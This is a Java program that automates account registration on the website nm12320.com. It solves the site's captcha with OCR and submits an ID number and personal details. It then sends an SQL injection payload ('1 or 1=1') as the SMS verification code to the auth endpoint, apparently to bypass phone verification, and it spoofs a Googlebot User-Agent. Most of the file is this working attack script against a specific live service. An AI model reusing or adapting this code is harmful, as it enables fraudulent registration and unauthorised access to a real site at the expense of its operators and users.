package l.t.y.orc;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class FormCommit {

	public static void main(String[] args) throws Exception {

		String imgUrl = "http://www.nm12320.com/captcha.svl";
		String path="D:/abc.jpg";
		String jsid=download(imgUrl,path);
		System.out.println(jsid);
		jsid=jsid.substring(11);
		String valCode = new OCR().recognizeText(new File(path), "jpg");
		
		System.out.println(valCode);
		
		String url = "http://www.nm12320.com/userRegister.jspx";

		List<BasicNameValuePair> data = new ArrayList<BasicNameValuePair>();
		data.add(new BasicNameValuePair("user_id", "98984250"));
		data.add(new BasicNameValuePair("user_password", "123123"));
		data.add(new BasicNameValuePair("user_repassword", "123123"));
		data.add(new BasicNameValuePair("user_name", "123123"));
		data.add(new BasicNameValuePair("address", "1501"));
		data.add(new BasicNameValuePair("sex", "1"));
		data.add(new BasicNameValuePair("idTypeId", "1"));
		data.add(new BasicNameValuePair("idcard_num", "440901197709194316"));
		data.add(new BasicNameValuePair("birthday", "1977-09-19"));
		data.add(new BasicNameValuePair("tel", "18612341234"));
		data.add(new BasicNameValuePair("captcha", valCode));
		data.add(new BasicNameValuePair("agree", "1"));
		String body = HttpClientUtil.doPost(url, "", data);
		
		int ind=body.indexOf("<input name=\"userId\" value=");
		if(ind==-1)
			return;
		String userId=body.substring(ind+27,ind+6+27);
		System.out.println(userId);
//		System.out.println(body);
		
		String msgUrl="http://www.nm12320.com/userRegisterAuth.jspx";
		
		data = new ArrayList<BasicNameValuePair>();
		data.add(new BasicNameValuePair("user_id", userId));
		data.add(new BasicNameValuePair("authCode", "1 or 1=1 "));
		
		HttpPost httpPost = new HttpPost(msgUrl);
		try {
			httpPost.setHeader("Cookie", "JSESSIONID=" + jsid);
			httpPost.setEntity(new UrlEncodedFormEntity(data, "UTF-8"));
			HttpResponse httpResponse = HttpClientUtil.getInstance().execute(httpPost);
			if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
				String body1=EntityUtils.toString(httpResponse.getEntity());
				File file=new File("D:/body1.txt");
				if(!file.exists()){
					file.createNewFile();
				}
				  byte bytes[]=body1.getBytes();
				  int b=body1.getBytes().length;
				  FileOutputStream fos=new FileOutputStream(file);
				  fos.write(bytes,0,b);
				  fos.close();
			} else {
//				System.out.println( httpResponse.getStatusLine().toString());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		System.out.println(body);
		
	}

	public static String download(String url, String filePathName) {
		String jsid="";
		HttpClient httpclient = new DefaultHttpClient();
		try {
			HttpGet httpget = new HttpGet(url);

			// 伪装成google的爬虫JAVA问题查询
			httpget.setHeader("User-Agent",
					"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
			
			System.out.println("executing request " + httpget.getURI());
			HttpResponse response = httpclient.execute(httpget);

			File storeFile = new File(filePathName);
			FileOutputStream output = new FileOutputStream(storeFile);

			// 得到网络资源的字节数组,并写入文件
			Header[] headers=response.getHeaders("Set-Cookie");
			
			for(Header header:headers){
				if(header.getName().equalsIgnoreCase("Set-Cookie")){
					jsid=header.getValue();
				}
			}
			
			HttpEntity entity = response.getEntity();
			if (entity != null) {
				InputStream instream = entity.getContent();
				try {
					byte b[] = new byte[1024];
					int j = 0;
					while ((j = instream.read(b)) != -1) {
						output.write(b, 0, j);
					}
					output.flush();
					output.close();
				} catch (IOException ex) {
					throw ex;
				} catch (RuntimeException ex) {
					httpget.abort();
					throw ex;
				} finally {
					try {
						instream.close();
					} catch (Exception ignore) {
					}
				}
			}

		} catch (Exception e) {
		} finally {
			httpclient.getConnectionManager().shutdown();
		}
		
		return jsid;
	}
}
